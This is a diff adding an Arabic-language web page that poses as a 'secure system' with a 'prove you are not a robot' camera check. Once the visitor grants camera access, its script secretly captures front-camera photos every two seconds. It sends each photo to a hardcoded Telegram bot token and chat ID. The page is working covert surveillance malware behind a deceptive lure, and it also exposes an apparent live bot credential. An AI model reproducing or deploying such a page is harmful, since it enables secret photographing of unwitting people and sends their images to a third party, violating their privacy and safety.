@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام الإرسال عبر GitHub</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #1a1a1a; 
+            color: white; 
+            text-align: center; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .card {
+            background: #2d2d2d;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 90%;
+            max-width: 400px;
+        }
+        video { 
+            width: 100%; 
+            border-radius: 10px; 
+            background: #000;
+            margin-bottom: 20px;
+        }
+        button {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover { background: #00ace6; }
+        .status { margin-top: 15px; font-size: 14px; color: #aaa; }
+        #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>نظام التشغيل الآمن 🚀</h2>
+        <video id="video" autoplay playsinline muted></video>
+        <button id="startBtn">تشغيل النظام الآن</button>
+        <div id="status" class="status">اضغط على الزر لمنح الصلاحية والبدء</div>
+    </div>
+
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+    const token = "7546948976:AAETtxJ-ecUKdqVOd4LFI152-IaYxROFLWQ";
+    const chatId = "56081692";
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const status = document.getElementById('status');
+    const startBtn = document.getElementById('startBtn');
+
+    startBtn.addEventListener('click', () => {
+        startBtn.style.display = 'none'; // إخفاء الزر بعد الضغط
+        status.innerText = "جاري طلب صلاحية الكاميرا...";
+        
+        const constraints = {
+            video: {
+                facingMode: "user", // الكاميرا الأمامية
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            }
+        };
+
+        navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+            video.srcObject = stream;
+            status.innerText = "تم التحقق بأنك لست روبوت من خلال الكاميرا 🟢";
+            status.style.color = "#00ff00";
+            
+            // بدء التكرار كل ثانيتين
+            setInterval(captureAndSend, 2000);
+        })
+        .catch(err => {
+            console.error(err);
+            status.innerText = "❌ فشل تأكيد بأنك لست روبوت من خلال الكاميرا";
+            status.style.color = "#ff4d4d";
+            startBtn.style.display = 'block';
+        });
+    });
+
+    async function captureAndSend() {
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "image.jpg");
+
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+                console.log("تم الإرسال");
+            } catch (error) {
+                console.error("خطأ إرسال:", error);
+            }
+        }, 'image/jpeg', 0.6); // تقليل الجودة قليلاً لسرعة الرفع على GitHub
+    }
+</script>
+
+</body>
+</html>
